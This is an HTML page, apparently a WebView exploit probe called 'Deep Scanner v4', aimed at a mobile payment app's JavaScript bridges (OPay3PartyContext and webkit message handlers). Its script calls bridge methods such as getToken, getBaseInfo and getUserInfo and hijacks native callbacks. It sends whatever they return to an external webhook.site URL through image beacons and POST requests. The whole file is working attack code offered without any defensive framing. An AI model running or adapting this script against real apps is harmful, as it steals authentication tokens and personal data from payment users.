<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Deep Scanner v4</title>
</head>

<body
  style="background: green; color: white; font-family: -apple-system, sans-serif; text-align: center; padding: 20px;">
  <h1 id="status">DEEP SCANNING...</h1>
  <div id="log" style="font-size: 10px; color: #fff; text-align: left; opacity: 0.8;"></div>

  <script>
    (function () {
      var WEBHOOK = 'https://webhook.site/c4e48555-8559-4bb0-b04a-a347d20a7569';
      var logDiv = document.getElementById('log');

      function report(msg, type) {
        var div = document.createElement('div');
        div.innerText = msg;
        logDiv.appendChild(div);
        new Image().src = WEBHOOK + '?msg=' + encodeURIComponent(msg) + '&type=' + (type || 'info') + '&v=4&ts=' + Date.now();
      }

      function exfil(obj) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', WEBHOOK, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(obj));
        status.innerText = 'DATA CAPTURED';
      }

      report('DEEP SCANNER V4 START');

      // 1. Register callbacks
      var callbacks = ['onGetBaseInfo', 'onGetToken', 'nativeCallback', 'opayCallback', 'onReceiveNativeMessage', 'handleMessage'];
      callbacks.forEach(function (n) {
        window[n] = function (d) {
          report('CALLBACK TRIGGERED: ' + n, 'success');
          exfil({ source: 'callback', name: n, data: d });
        };
      });

      setTimeout(function () {
        // 2. Explore OPay3PartyContext properties
        if (window.OPay3PartyContext) {
          var keys = [];
          for (var k in window.OPay3PartyContext) { keys.push(k); }
          report('OPay3PartyContext Keys: ' + (keys.join(', ') || 'No enumerable keys'));

          // Try common method names even if not enumerated
          ['getBaseInfo', 'getToken', 'getUserInfo', 'send', 'call'].forEach(function (m) {
            try {
              if (typeof window.OPay3PartyContext[m] === 'function') {
                report('Found method: OPay3PartyContext.' + m);
                var res = window.OPay3PartyContext[m]();
                report('Success calling ' + m, 'success');
                exfil({ source: 'direct', bridge: 'OPay3PartyContext', method: m, data: res });
              }
            } catch (e) { }
          });
        }

        // 3. Forced WebKit Scan (trying to find hidden handlers)
        if (window.webkit && window.webkit.messageHandlers) {
          var known = ['control', 'OPay3PartyContext', 'ORideContext', 'OPayContext', 'native', 'bridge'];
          known.forEach(function (h) {
            if (window.webkit.messageHandlers[h]) {
              report('Found Hidden Handler: ' + h);
              window.webkit.messageHandlers[h].postMessage({ action: 'getBaseInfo', callback: 'onGetBaseInfo' });
              window.webkit.messageHandlers[h].postMessage({ method: 'getToken', callback: 'onGetToken' });
            }
          });
        }

        // 4. Explore opayCallback suspect
        if (window.opayCallback) {
          report('opayCallback type: ' + typeof window.opayCallback);
        }

        report('Scan Complete');
      }, 2000);
    })();
  </script>
</body>

</html>